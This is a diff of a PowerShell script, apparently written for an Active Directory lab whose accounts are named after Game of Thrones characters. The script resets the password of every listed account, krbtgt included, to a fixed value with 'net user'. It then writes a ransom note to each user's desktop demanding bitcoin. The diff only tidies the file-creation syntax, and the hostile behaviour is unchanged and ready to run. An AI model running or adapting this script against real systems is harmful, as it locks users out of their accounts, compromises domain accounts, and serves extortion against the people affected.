@@ -1,2 +1,2 @@
 $users = @("catelyn.stark","hodor","krbtgt","robb.stark","sql_svc","arya.stark","eddard.stark","jeor.mormont","samwell.tarly","brandon.stark","jon.snow","rickon.stark","sansa.stark")
-foreach($user in $users){net user $user ChinaNumber1;if (Test-Path C:\Users\$user){New-Item -Name C:\Users\$user\Desktop\RANSOM.txt -Value "YOU HAVE BEEN HACKED!! ALL OF YOUR PASSWORDS HAVE BEEN CHANGED!! SEND 1000USD TO THIS BTC ADDRESS XXXXXXXXXXXXXXX" > C:\Users\$user\Desktop\RANSOM_NOTE.txt}}
+foreach($user in $users){net user $user ChinaNumber1;if (Test-Path C:\Users\$user){New-Item -Name C:\Users\$user\Desktop\RANSOM.txt -Value "YOU HAVE BEEN HACKED!! ALL OF YOUR PASSWORDS HAVE BEEN CHANGED!! SEND 1000USD TO THIS BTC ADDRESS XXXXXXXXXXXXXXX"}}
